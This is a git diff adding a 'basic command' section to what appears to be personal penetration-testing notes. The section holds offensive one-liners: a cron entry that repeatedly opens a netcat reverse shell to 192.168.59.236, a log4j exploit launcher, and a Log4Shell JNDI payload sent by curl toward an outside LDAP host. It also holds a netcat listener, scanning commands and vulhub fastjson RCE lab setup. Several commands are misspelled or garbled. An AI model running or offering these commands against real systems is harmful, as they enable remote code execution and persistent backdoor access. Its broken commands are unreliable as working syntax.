@@ -71,3 +71,51 @@ plugin_passwd=
  #映射到共外网服务器的端口
 remote_port = 8000
 ```
+
+# basic command
+```
+crontab -e */1 * * * * nc 192.168.59.236 6666 -e "/bin/bash"
+sudo log4j.py --userip 119.91.116.174 --webport 8000 --lport 9999
+rlwrap nc -lvvp 8888
+curl -H 'X-Api-Version: ${jndi:ldap://119.91.116.174/a}' https://docker.zzzang.cn/
+python3 -c "import spy;spy.swapn('/bin/bash')"
+nmap -p- x.x.x.x -oN t.log
+gobuster dir -u -w seclissts -x php，zip
+find / -type f -executable -daystart -ctime 0
+
+sed -i '/INF/d' icloud_port.txt
+certutil -hashfile pspy64 MD5
+sudo netdiscover -i eth0 x.x.x.x 2>/dev/null
+echo 'S3VuZ19GdV9QNG5kYQ==' | base64 -d
+export PATH=/srv/scripts:$PATH
+
+vim ~/.bashrc (export PATH=$PATH:/srv/scripts)
+wget -r ftp://10.0.2.10
+wc -l wordlist.txt
+lsof -i:9988
+cd /proc/pid; ls -al; cat /status; kill -9 ppid
+
+sudo usermod -l Cyber kali
+vim /etc/hostname
+awk '{print "http://"$0}' 1.txt > 2.txt 
+cat 2.txt | jq -r '.hostnames[]' > zimtra-edu.txt
+
+
+# docker
+>wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip
+unzip vulhub-master.zip
+cd vulhub-master/fastjson/ 1.2.47-rce/
+docker-compose build
+docker-compose up -d
+
+
+# mvn编译 marshalsec项目
+mvn clean package -DskipTests
+
+$ git init
+$ git add . & git commit "test"
+$ git remote add nu git@github.com:zhujieta0/nuc.git
+$ git branc -M main
+$ git push zaq main
+No file chosen
+```
